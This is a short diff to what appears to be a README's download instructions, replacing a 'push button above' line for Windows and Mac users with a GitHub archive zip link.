@@ -8,4 +8,6 @@ Open terminal and type this command:
 
 # Another way
 
-If you using windows or mac you can push button above this text and download docs and other files.
+If you using windows or mac you can go to this link and download files:
+
+https://github.com/dazsfr-org/share/archive/master.zip
